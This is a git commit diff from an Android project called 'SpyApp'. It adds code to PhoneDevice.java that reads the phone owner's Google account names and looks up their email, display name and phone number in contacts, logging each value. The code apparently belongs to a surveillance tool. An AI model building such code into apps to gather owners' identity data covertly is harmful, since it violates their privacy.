566a374fb5ef593f79fe2aed4c2f2c7bae009616
flobouch <bouchot.florian@gmail.com>
2014-04-07 10:48:29 -0400

    Get Owner Accounts, plus name

--- SpyApp/src/phoneDeviceInformations/PhoneDevice.java
+++ SpyApp/src/phoneDeviceInformations/PhoneDevice.java
@@ -2,10 +2,12 @@ package phoneDeviceInformations;
 
 import java.util.ArrayList;
 
-import android.R.string;
 import android.accounts.Account;
 import android.accounts.AccountManager;
+import android.content.ContentResolver;
 import android.content.Context;
+import android.database.Cursor;
+import android.provider.ContactsContract;
 import android.util.Log;
 
 public class PhoneDevice {
@@ -71,14 +73,73 @@ public class PhoneDevice {
 	}
 	public void OwnerInformations(Context context){
 	
-	  final AccountManager manager = AccountManager.get(context);
+	/*  final AccountManager manager = AccountManager.get(context);
     final Account[] accounts = manager.getAccountsByType("com.google");
     final int size = accounts.length;
     String[] names = new String[size];
     for (int i = 0; i < size; i++) {
       names[i] = accounts[i].name;
     Log.d("efe",names[i]);
-    }
-    
+    }*/
+		 String id = null;
+		 String email = null;
+		 String phone = null;
+		 String accountName = null;
+		 String name = null;
+		 
+		final AccountManager manager = AccountManager.get(context);
+		final Account[] accounts = manager.getAccountsByType("com.google");
+		if (accounts[0].name != null) {
+		accountName = accounts[0].name;	
+		String where=ContactsContract.CommonDataKinds.Email.DATA + " = ?";
+		ArrayList<String> what = new ArrayList<String>();
+		what.add(accountName);	
+		Log.v("Got account", "Account " + accountName);
+		for (int i=1;i<accounts.length;i++)
+		{
+		where+=" or "+ContactsContract.CommonDataKinds.Email.DATA + " = ?";
+		what.add(accounts[i].name);
+		Log.v("Got account", "Account " + accounts[i].name);
+		}
+		String[] whatarr=(String[]) what.toArray(new String[what.size()]);
+		ContentResolver cr = context.getContentResolver();
+		Cursor emailCur = cr.query(
+		ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
+		where,
+		whatarr, null);
+		while (emailCur.moveToNext()) {
+		id = emailCur
+		.getString(emailCur
+		.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID));
+		email = emailCur
+		.getString(emailCur
+		.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
+		String newName = emailCur
+		.getString(emailCur
+		.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+		if (name == null || newName.length() > name.length())
+		name = newName;
+
+		Log.v("Got contacts", "ID " + id + " Email : " + email
+		+ " Name : " + name);
+		}
+
+		emailCur.close();
+		if (id != null) {
+
+		// get the phone number
+		Cursor pCur = cr.query(
+		ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+		null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID
+		+ " = ?", new String[] { id }, null);
+		while (pCur.moveToNext()) {
+		phone = pCur
+		.getString(pCur
+		.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+		Log.v("Got contacts", "phone" + phone);
+		}
+		pCur.close();
+		}
+		}
     }
 }
